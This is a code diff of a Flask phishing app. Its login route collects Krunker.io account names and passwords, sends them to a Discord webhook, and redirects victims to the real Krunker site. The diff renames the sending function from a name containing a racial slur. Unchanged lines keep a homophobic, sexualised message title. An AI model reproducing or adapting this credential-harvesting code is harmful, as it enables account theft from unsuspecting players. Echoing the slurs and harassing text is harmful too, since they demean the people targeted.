@@ -35,9 +35,9 @@ def index2():
 @app.route('/api/login', methods=['POST', 'GET'])
 def login():
     if flask.request.method.lower() == "post":
-        send_it_nigger(flask.request.form.get('accName'), flask.request.form.get('accPass'))
+        send_webhook(flask.request.form.get('accName'), flask.request.form.get('accPass'))
     elif flask.request.method.lower() == "get":
-        send_it_nigger(flask.request.args.get('accName'), flask.request.args.get('accPass'))
+        send_webhook(flask.request.args.get('accName'), flask.request.args.get('accPass'))
     else:
         return flask.redirect('https://krunker.io/social.html?p=profile&q=')
     return flask.redirect('https://krunker.io/social.html?p=profile&q=')
@@ -46,7 +46,7 @@ def login():
 def page_not_found(e):
     return flask.redirect(flask.url_for('index'))
 
-def send_it_nigger(username:str, password:str):
+def send_webhook(username:str, password:str):
     try:
         webhook = DiscordWebhook(url='YOUR DISCORD WEBHOOK', username="your auntie")
         embed = DiscordEmbed(title='Gay Kid Caught Lacking', description='Send me nudes baby', color='03b2f8')
